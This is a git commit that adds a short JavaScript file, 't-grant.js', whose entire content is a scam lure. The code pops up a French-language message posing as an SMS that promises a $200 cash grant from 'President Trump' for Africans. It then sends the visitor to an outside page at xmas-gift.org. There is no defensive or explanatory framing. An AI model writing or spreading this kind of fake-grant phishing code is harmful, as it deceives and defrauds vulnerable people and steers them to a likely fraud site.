8f82922bf65d6ec4a04bbcfde64cc7a8949fd4b1
4g-network <154092422+4g-network@users.noreply.github.com>
2024-11-07 10:14:15 -0800

    Create t-grant.js

---
+++ t-grant.js
@@ -0,0 +1,6 @@
+
+var password = 'RETRAIT 200 $'
+password=prompt('SMS: Félicitations, vous êtes admissible à la subvention en espèces de 200 $ du président Trump pour les Africains. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETRAIT 200 $');
+if (password != 'RETRAIT 200 $') {
+location.href='https://xmas-gift.org/grant-gov.html';
+}
